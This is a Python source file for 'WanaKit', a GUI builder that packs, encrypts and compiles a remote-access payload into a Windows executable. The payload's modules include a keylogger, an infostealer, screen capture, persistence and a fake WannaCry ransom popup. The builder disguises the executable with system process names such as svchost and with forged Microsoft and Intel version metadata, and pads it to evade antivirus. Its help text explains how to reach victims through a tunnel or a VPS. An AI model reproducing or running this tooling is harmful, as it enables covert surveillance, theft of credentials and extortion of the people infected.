#!/usr/bin/env python3
import os, sys, re, json, time, zlib, base64, random, string, hashlib, shutil, socket
import subprocess, threading, tempfile, marshal, queue, traceback
import tkinter as tk
from tkinter import ttk, filedialog
from pathlib import Path

HERE = Path(__file__).resolve().parent
SRC = HERE / "src"
OUT = HERE / "output"
ZIP_PW = "helloworld"
NEED = ["pyinstaller", "Crypto", "pyzipper", "PIL"]

BG, CARD, CARD2, EDGE = "#070a0e", "#101821", "#16202b", "#233240"
FG, MUT, ACC, ACC2, GRN, RED, YEL = "#d5dde5", "#6e7781", "#58a6ff", "#8b5cf6", "#3fb950", "#f85149", "#d29922"

HIDDEN = ["PIL.ImageGrab", "PIL._tkinter_finder", "Crypto.Cipher.AES", "winreg",
          "tkinter", "tkinter.ttk", "sqlite3", "winsound", "ctypes.wintypes", "platform", "uuid"]
MODULES = ["mod_sys", "mod_net", "mod_shot", "mod_keys", "mod_spy", "mod_fs", "mod_desk",
           "mod_extra", "mod_troll", "mod_kbd", "mod_steal", "mod_ransom", "mod_persist", "mod_cmd"]
NAMES = ["svchost", "winlogon", "RuntimeBroker", "WindowsUpdate", "SearchIndexer",
         "SecurityHealth", "OneDriveSync", "dllhost", "taskhostw", "conhost"]
COMPANIES = [("Microsoft Corporation", "Windows Service Host", "Microsoft Windows"),
             ("Microsoft Corporation", "Windows Component", "Microsoft Windows Operating System"),
             ("Realtek Semiconductor", "Audio Service", "Realtek HD Audio"),
             ("Intel Corporation", "System Component", "Intel Management Engine")]

VERSION_TMPL = """
VSVersionInfo(
  ffi=FixedFileInfo(filevers=(1,0,0,0), prodvers=(1,0,0,0), mask=0x3f, flags=0x0,
                    OS=0x40004, fileType=0x1, subtype=0x0, date=(0,0)),
  kids=[StringFileInfo([StringTable('040904B0', [
    StringStruct('CompanyName', '{company}'),
    StringStruct('FileDescription', '{desc}'),
    StringStruct('FileVersion', '1.0.0.0'),
    StringStruct('InternalName', '{internal}'),
    StringStruct('OriginalFilename', '{filename}'),
    StringStruct('ProductName', '{product}'),
    StringStruct('ProductVersion', '1.0.0.0')])]),
  VarFileInfo([VarStruct('Translation', [1033, 1200])])])
"""

HELP = {
    "this machine": [
        "1. Leave host as 127.0.0.1 and port 4444.",
        "2. Start the server first: python server.py",
        "3. Wait until the header is green and says LISTENING.",
        "4. Hit BUILD, then run the EXE from output\\.",
        "5. It appears in the machine list within seconds.",
        "Loopback only works while server and EXE are on the same PC.",
    ],
    "same network": [
        "1. Run ipconfig, note the 192.168.x.x of your active adapter.",
        "2. Put that IP in the host field, keep port 4444.",
        "3. Allow the port as admin:",
        "   netsh advfirewall firewall add rule name=wnk dir=in action=allow protocol=TCP localport=4444",
        "4. Start the server, verify the header goes green.",
        "5. Build, then run the EXE on the other machine.",
        "Both machines must be on the same router / subnet.",
    ],
    "outside network": [
        "Option A - tunnel, no VPS:",
        "1. Start the server locally.",
        "2. cloudflared tunnel --url tcp://localhost:4444",
        "3. It prints host:port. Put that host and port in the builder.",
        "4. Build and deliver the EXE.",
        "The tunnel URL changes on restart, so rebuild after each restart.",
        "",
        "Option B - VPS:",
        "1. Rent a small Windows/Linux box, install Python + pycryptodome.",
        "2. Open TCP 4444 in the provider firewall and the OS firewall.",
        "3. Copy the wanakit folder there, run python server.py.",
        "4. Build with the VPS IP and port.",
    ],
}


def rnd(n=8):
    return "".join(random.choice(string.ascii_lowercase) for _ in range(n))


def mangle(src):
    names = set(re.findall(r"\b(?:f_|g_)[A-Za-z0-9_]+", src))
    t = {n: rnd(9) for n in names}
    for n in sorted(names, key=len, reverse=True):
        src = re.sub(r"\b" + n + r"\b", t[n], src)
    return src


def uuid_node():
    import uuid
    return uuid.getnode()


def machine_info():
    def run(c):
        try:
            return subprocess.run(c, capture_output=True, text=True, timeout=8,
                                  creationflags=0x08000000).stdout.strip()
        except Exception:
            return ""
    vol = re.search(r"([0-9A-Fa-f]{4}-[0-9A-Fa-f]{4})", run(["cmd", "/c", "vol", "c:"]))
    hwid = hashlib.sha256("|".join([os.environ.get("COMPUTERNAME", ""), os.environ.get("USERNAME", ""),
                                    vol.group(1) if vol else "", str(uuid_node())]).encode()).hexdigest()[:20]
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        lip = s.getsockname()[0]
        s.close()
    except Exception:
        lip = "0.0.0.0"
    return {"host": os.environ.get("COMPUTERNAME", "?"), "user": os.environ.get("USERNAME", "?"),
            "os": __import__("platform").platform()[:70],
            "arch": os.environ.get("PROCESSOR_ARCHITECTURE", "?"), "lan": lip, "hwid": hwid,
            "admin": False, "py": sys.version.split()[0]}


def bootstrap(log):
    miss = []
    for m in NEED:
        try:
            __import__(m)
        except Exception:
            miss.append(m)
    if not miss:
        return True
    log("installing " + ", ".join(miss), "warn")
    for c in ([sys.executable, "-m", "pip", "install", "--upgrade", "pip", "-q"],
              [sys.executable, "-m", "pip", "install", "--upgrade", *miss]):
        if subprocess.run(c, capture_output=True).returncode != 0:
            log("pip failed", "err")
            return False
    return True


class Builder:
    def __init__(self, app):
        self.app = app

    def cfg(self):
        a = self.app
        hard = bool(a.v_hard.get())
        name = a.e_name.get().strip()
        if hard and (not name or name in NAMES):
            name = random.choice(NAMES) + str(random.randint(10, 99))
        return {"id": "w" + rnd(7), "host": a.e_host.get().strip(),
                "port": int(a.e_port.get() or 4444), "tls": bool(a.v_tls.get()),
                "psk": a.psk, "hb": max(2, int(a.e_hb.get() or 15)),
                "shot": max(5, int(a.e_shot.get() or 60)), "retry": [5, 20],
                "keybuf": 25, "clipbuf": 25,
                "ransom_delay": int(a.e_rdelay.get() or 25),
                "ransom_days": int(a.e_days.get() or 3),
                "mods": {k: bool(v.get()) for k, v in a.mods.items()},
                "info": a.info, "built": int(time.time()),
                "exename": name or rnd(9), "debug": bool(a.v_console.get())}

    def source(self, cfg):
        hdr = (SRC / "header.py").read_text(encoding="utf-8").replace("__CFG__", repr(cfg))
        parts = [hdr] + [(SRC / (m + ".py")).read_text(encoding="utf-8") for m in MODULES]
        parts.append((SRC / "tail.py").read_text(encoding="utf-8"))
        return "\n\n".join(parts)

    def pack(self, cfg):
        src = mangle(self.source(cfg))
        blob = zlib.compress(marshal.dumps(compile(src, "<w>", "exec", optimize=2)), 9)
        from Crypto.Cipher import AES
        seed = os.urandom(16)
        key = hashlib.sha256(seed + b"wnk" + bytes.fromhex(cfg["psk"])).digest()
        n = os.urandom(12)
        c = AES.new(key, AES.MODE_GCM, nonce=n)
        ct, tag = c.encrypt_and_digest(blob)
        stub = (SRC / "stub_template.py").read_text(encoding="utf-8")
        stub = stub.replace("__S1__", seed[:8].hex()).replace("__S2__", seed[8:].hex())
        stub = stub.replace("__SALT__", bytes.fromhex(cfg["psk"]).hex())
        stub = stub.replace("__BLOB__", base64.b64encode(n + ct + tag).decode())
        return stub, len(src), len(blob)

    def icon(self, path):
        from PIL import Image, ImageDraw
        s = 256
        hue = random.choice([(0, 120, 215), (16, 124, 16), (196, 43, 28), (0, 99, 177), (120, 90, 180)])
        im = Image.new("RGBA", (s, s), (0, 0, 0, 0))
        d = ImageDraw.Draw(im)
        d.rounded_rectangle([6, 6, s - 6, s - 6], radius=44, fill=hue + (255,))
        d.rectangle([62, 92, 194, 196], fill=(255, 255, 255, 240))
        d.rectangle([62, 92, 194, 118], fill=(255, 255, 255, 255))
        for i in range(3):
            d.line([86, 146 + i * 22, 170, 146 + i * 22], fill=hue + (255,), width=7)
        im.save(path, sizes=[(16, 16), (32, 32), (48, 48), (64, 64), (128, 128), (256, 256)])

    def pad(self, p, log):
        try:
            n = random.randint(4096, 32768)
            with open(p, "ab") as f:
                f.write(b"\x00" * 64 + os.urandom(n))
            log("padded +%d bytes, unique hash" % n, "ok")
        except Exception as e:
            log("pad failed " + repr(e), "warn")

    def run(self):
        a, log = self.app, self.app.log
        try:
            if not a.e_host.get().strip():
                log("host required", "err")
                return
            if not bootstrap(log):
                return
            a.set_progress(5)
            a.info = machine_info()
            a.show_info()
            cfg = self.cfg()
            hard = bool(a.v_hard.get())
            work = Path(tempfile.mkdtemp(prefix="wnk_"))
            stub, sl, bl = self.pack(cfg)
            log("payload %d -> %d bytes" % (sl, bl), "ok")
            sp = work / (rnd(10) + ".py")
            sp.write_text(stub, encoding="utf-8")
            a.set_progress(30)

            exe = cfg["exename"]
            ico = a.e_icon.get().strip()
            if hard and not ico:
                try:
                    ico = str(work / "i.ico")
                    self.icon(ico)
                except Exception:
                    ico = ""
            company, desc, product = random.choice(COMPANIES) if hard else COMPANIES[0]
            ver = work / "v.txt"
            ver.write_text(VERSION_TMPL.format(company=company, desc=desc, internal=exe,
                                              filename=exe + ".exe", product=product), encoding="utf-8")

            if a.v_comp.get() == "nuitka":
                dist = work / "dist"
                cmd = [sys.executable, "-m", "nuitka", "--onefile", "--assume-yes-for-downloads",
                       "--mingw64", "--remove-output", "--output-dir=" + str(dist),
                       "--output-filename=" + exe + ".exe"]
                if not a.v_console.get():
                    cmd.append("--windows-disable-console")
                if ico:
                    cmd.append("--windows-icon-from-ico=" + ico)
                cmd.append(str(sp))
            else:
                dist = work / "dist"
                cmd = [sys.executable, "-m", "PyInstaller", "--noconfirm", "--clean", "--onefile",
                       "--name", exe, "--distpath", str(dist), "--workpath", str(work / "build"),
                       "--specpath", str(work), "--version-file", str(ver), "--log-level", "WARN"]
                if not a.v_console.get():
                    cmd.append("--noconsole")
                if hard:
                    cmd.append("--noupx")
                if ico:
                    cmd += ["--icon", ico]
                for h in HIDDEN:
                    cmd += ["--hidden-import", h]
                cmd.append(str(sp))

            log("compiling with " + a.v_comp.get() + " (be patient)", "info")
            p = subprocess.run(cmd, capture_output=True, text=True)
            if p.returncode != 0:
                log("compile failed:\n" + (p.stderr or p.stdout)[-1500:], "err")
                return
            a.set_progress(80)
            built = dist / (exe + ".exe")
            if not built.exists():
                log("exe not produced", "err")
                return

            OUT.mkdir(exist_ok=True)
            final = OUT / (exe + ".exe")
            shutil.copy2(built, final)
            log("exe %d KB" % (final.stat().st_size // 1024), "ok")
            if hard:
                self.pad(final, log)
            (OUT / "psk.txt").write_text(cfg["psk"], encoding="utf-8")
            ok = self.zip(OUT / (exe + ".zip"), [final, OUT / "psk.txt"], log)
            a.set_progress(100)
            log("DONE -> " + str(final), "ok")
            log("PSK: " + cfg["psk"], "ok")
            shutil.rmtree(work, ignore_errors=True)
        except Exception:
            log(traceback.format_exc()[-1500:], "err")
        finally:
            a.building = False
            a.set_progress(0)

    def verify(self, p):
        import zipfile
        try:
            with zipfile.ZipFile(p) as z:
                z.setpassword(ZIP_PW.encode())
                z.read(z.namelist()[0])
            return True
        except Exception:
            return False

    def zip(self, path, files, log):
        files = [str(f) for f in files if Path(f).exists()]
        tmp = str(path) + ".part"
        try:
            import pyzipper
            with pyzipper.ZipFile(tmp, "w", compression=pyzipper.ZIP_DEFLATED,
                                  encryption=pyzipper.ZIP_CRYPTO) as z:
                z.setpassword(ZIP_PW.encode())
                for f in files:
                    z.write(f, Path(f).name)
            if self.verify(tmp):
                shutil.move(tmp, str(path))
                log("zip ok, password " + ZIP_PW, "ok")
                return True
            log("zip verify failed", "warn")
        except Exception as e:
            log("zip failed " + repr(e), "warn")
        if Path(tmp).exists():
            Path(tmp).unlink()
        return False


class App(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("WanaKit")
        self.geometry("1180x820")
        self.configure(bg=BG)
        self.minsize(1000, 740)
        self.info, self.q, self.mods = {}, queue.Queue(), {}
        self.psk = os.urandom(32).hex()
        self.building = False
        self._style()
        self._build()
        self.after(120, self._drain)
        self.refresh_info()

    def _style(self):
        s = ttk.Style(self)
        s.theme_use("clam")
        s.configure(".", background=BG, foreground=FG, fieldbackground=CARD2, bordercolor=EDGE)
        s.configure("TFrame", background=BG)
        s.configure("Card.TFrame", background=CARD)
        s.configure("TLabel", background=BG, foreground=FG)
        s.configure("Card.TLabel", background=CARD, foreground=FG)
        s.configure("Head.TLabel", background=CARD, foreground=ACC, font=("Segoe UI Semibold", 10))
        s.configure("Title.TLabel", background=BG, foreground=FG, font=("Segoe UI Semibold", 22))
        s.configure("Sub.TLabel", background=BG, foreground=MUT, font=("Consolas", 9))
        s.configure("TCheckbutton", background=CARD, foreground=FG)
        s.map("TCheckbutton", background=[("active", CARD)])
        s.configure("TEntry", fieldbackground=CARD2, foreground=FG, insertcolor=FG, borderwidth=0)
        s.configure("TButton", background=CARD2, foreground=FG, padding=6, borderwidth=0)
        s.map("TButton", background=[("active", EDGE)])
        s.configure("Go.TButton", background=ACC2, foreground="white",
                    font=("Segoe UI Semibold", 11), padding=10)
        s.map("Go.TButton", background=[("active", "#7c4dff")])
        s.configure("TProgressbar", background=ACC, troughcolor=CARD2, borderwidth=0)
        s.configure("TCombobox", fieldbackground=CARD2, background=CARD2, foreground=FG)

    def _build(self):
        head = tk.Frame(self, bg=BG)
        head.pack(fill="x", padx=18, pady=(16, 8))
        ttk.Label(head, text="WanaKit", style="Title.TLabel").pack(side="left")
        ttk.Label(head, text="   builder · packer · dropper", style="Sub.TLabel").pack(side="left", pady=8)
        ttk.Button(head, text="help", command=self.help_win).pack(side="right")
        self.state = tk.Label(head, text="idle", bg=BG, fg=MUT, font=("Consolas", 9))
        self.state.pack(side="right", padx=10)

        body = tk.Frame(self, bg=BG)
        body.pack(fill="both", expand=True, padx=18, pady=6)
        col1 = tk.Frame(body, bg=CARD, highlightbackground=EDGE, highlightthickness=1)
        col1.pack(side="left", fill="y", padx=(0, 10))
        col2 = tk.Frame(body, bg=BG)
        col2.pack(side="left", fill="both", expand=True)

        ttk.Label(col1, text="CONNECTION", style="Head.TLabel").pack(anchor="w", padx=14, pady=(14, 6))
        self.e_host = self._row(col1, "host", "127.0.0.1")
        r = ttk.Frame(col1, style="Card.TFrame")
        r.pack(fill="x", padx=14, pady=3)
        ttk.Label(r, text="port", style="Card.TLabel", width=9).pack(side="left")
        self.e_port = ttk.Entry(r, width=8)
        self.e_port.pack(side="left")
        self.e_port.insert(0, "4444")
        self.v_tls = tk.BooleanVar()
        ttk.Checkbutton(r, text="TLS", variable=self.v_tls).pack(side="left", padx=6)
        ttk.Button(col1, text="test connection", command=self.test).pack(fill="x", padx=14, pady=6)

        ttk.Label(col1, text="TIMING", style="Head.TLabel").pack(anchor="w", padx=14, pady=(14, 6))
        self.e_hb = self._row(col1, "heartbeat s", "15")
        self.e_shot = self._row(col1, "screenshot s", "60")
        self.e_rdelay = self._row(col1, "popup delay s", "25")
        self.e_days = self._row(col1, "countdown d", "3")

        ttk.Label(col1, text="MODULES", style="Head.TLabel").pack(anchor="w", padx=14, pady=(14, 6))
        for k, lb, d in (("beat", "heartbeat", True), ("shot", "screen capture", True),
                         ("keys", "keylogger", True), ("clip", "clipboard", True),
                         ("spy", "window spy", True), ("steal", "infostealer", True),
                         ("ransom", "fake wannacry", True), ("persist", "persistence", True),
                         ("watchdog", "watchdog + mutex", True)):
            v = tk.BooleanVar(value=d)
            self.mods[k] = v
            ttk.Checkbutton(col1, text=lb, variable=v).pack(anchor="w", padx=16, pady=1)

        card = tk.Frame(col2, bg=CARD, highlightbackground=EDGE, highlightthickness=1)
        card.pack(fill="x", pady=(0, 10))
        ttk.Label(card, text="BUILD", style="Head.TLabel").pack(anchor="w", padx=14, pady=(14, 6))
        self.e_name = self._row(card, "exe name", "svchost")
        r = ttk.Frame(card, style="Card.TFrame")
        r.pack(fill="x", padx=14, pady=3)
        ttk.Label(r, text="compiler", style="Card.TLabel", width=9).pack(side="left")
        self.v_comp = tk.StringVar(value="pyinstaller")
        ttk.Combobox(r, textvariable=self.v_comp, values=["pyinstaller", "nuitka"],
                     state="readonly", width=16).pack(side="left")
        self.e_icon = self._row(card, "icon", "")
        r = ttk.Frame(card, style="Card.TFrame")
        r.pack(fill="x", padx=14, pady=6)
        ttk.Button(r, text="pick icon", command=self.pick_icon).pack(side="left")
        ttk.Button(r, text="open output", command=self.open_out).pack(side="left", padx=6)
        ttk.Button(r, text="refresh info", command=self.refresh_info).pack(side="left")
        self.v_console = tk.BooleanVar()
        ttk.Checkbutton(card, text="console window (debug)", variable=self.v_console).pack(anchor="w", padx=16)
        self.v_hard = tk.BooleanVar(value=True)
        ttk.Checkbutton(card, text="defender hardening (icon, name, padding, no upx)",
                        variable=self.v_hard).pack(anchor="w", padx=16)
        ttk.Button(card, text="BUILD PAYLOAD", style="Go.TButton",
                   command=self.start).pack(fill="x", padx=14, pady=14)

        info = tk.Frame(col2, bg=CARD, highlightbackground=EDGE, highlightthickness=1)
        info.pack(fill="x", pady=(0, 10))
        ttk.Label(info, text="THIS MACHINE (auto-collected)", style="Head.TLabel").pack(anchor="w", padx=14, pady=(12, 4))
        self.txt_info = tk.Text(info, height=6, bg=CARD2, fg=GRN, font=("Consolas", 9),
                                bd=0, highlightthickness=0)
        self.txt_info.pack(fill="x", padx=14, pady=(0, 12))

        logc = tk.Frame(col2, bg=CARD, highlightbackground=EDGE, highlightthickness=1)
        logc.pack(fill="both", expand=True)
        h = tk.Frame(logc, bg=CARD)
        h.pack(fill="x", padx=14, pady=(12, 2))
        tk.Label(h, text="LOG", bg=CARD, fg=ACC, font=("Segoe UI Semibold", 10)).pack(side="left")
        self.pb = ttk.Progressbar(h, length=200, maximum=100)
        self.pb.pack(side="right")
        self.txt_log = tk.Text(logc, bg="#05080b", fg=FG, font=("Consolas", 9), bd=0,
                               highlightthickness=0, wrap="word")
        self.txt_log.pack(fill="both", expand=True, padx=14, pady=(0, 12))
        for t, c in (("ok", GRN), ("err", RED), ("warn", YEL), ("info", ACC), ("dim", MUT)):
            self.txt_log.tag_config(t, foreground=c)

    def _row(self, parent, label, default):
        r = ttk.Frame(parent, style="Card.TFrame")
        r.pack(fill="x", padx=14, pady=3)
        ttk.Label(r, text=label, style="Card.TLabel", width=11).pack(side="left")
        e = ttk.Entry(r)
        e.pack(side="left", fill="x", expand=True)
        if default:
            e.insert(0, default)
        return e

    def help_win(self):
        w = tk.Toplevel(self)
        w.title("help")
        w.geometry("720x520")
        w.configure(bg=BG)
        nb = ttk.Notebook(w)
        nb.pack(fill="both", expand=True, padx=10, pady=10)
        for title in ("this machine", "same network", "outside network"):
            f = tk.Frame(nb, bg=CARD)
            nb.add(f, text=title)
            t = tk.Text(f, bg=CARD, fg=FG, font=("Consolas", 10), bd=0, wrap="word")
            t.pack(fill="both", expand=True, padx=10, pady=10)
            t.insert("1.0", "\n".join(HELP[title]))
            t.config(state="disabled")

    def log(self, m, k="dim"):
        self.q.put((k, m))

    def _drain(self):
        try:
            while True:
                k, m = self.q.get_nowait()
                if k == "__pb__":
                    self.pb["value"] = m
                    continue
                if k == "__info__":
                    self.show_info()
                    continue
                self.txt_log.insert("end", "[%s] %s\n" % (time.strftime("%H:%M:%S"), m), k)
                self.txt_log.see("end")
                self.state.config(text="building" if self.building else "idle",
                                  fg=YEL if self.building else MUT)
        except queue.Empty:
            pass
        self.after(120, self._drain)

    def set_progress(self, v):
        self.q.put(("__pb__", v))

    def show_info(self):
        i = self.info or {}
        self.txt_info.delete("1.0", "end")
        self.txt_info.insert("1.0", "\n".join([
            "host   : %s  user: %s" % (i.get("host", "?"), i.get("user", "?")),
            "os     : %s" % i.get("os", "?")[:60],
            "arch   : %s" % i.get("arch", "?"),
            "lan ip : %s" % i.get("lan", "?"),
            "hwid   : %s" % i.get("hwid", "?")]))

    def refresh_info(self):
        threading.Thread(target=lambda: (self.info.update(machine_info()),
                                        self.q.put(("__info__", None))), daemon=True).start()

    def pick_icon(self):
        f = filedialog.askopenfilename(filetypes=[("ico", "*.ico")])
        if f:
            self.e_icon.delete(0, "end")
            self.e_icon.insert(0, f)

    def open_out(self):
        OUT.mkdir(exist_ok=True)
        os.startfile(str(OUT))

    def test(self):
        h, p = self.e_host.get().strip(), int(self.e_port.get() or 0)

        def w():
            try:
                socket.create_connection((h, p), timeout=5).close()
                self.log("reachable", "ok")
            except Exception as e:
                self.log("unreachable: " + str(e), "err")
        threading.Thread(target=w, daemon=True).start()

    def start(self):
        if self.building:
            return
        if not re.fullmatch(r"[A-Za-z0-9_\-]{3,40}", self.e_name.get().strip() or "x"):
            self.log("bad exe name", "err")
            return
        self.building = True
        threading.Thread(target=Builder(self).run, daemon=True).start()


if __name__ == "__main__":
    try:
        App().mainloop()
    except Exception:
        e = traceback.format_exc()
        (HERE / "builder_error.log").write_text(e, encoding="utf-8")
        print(e)
        input()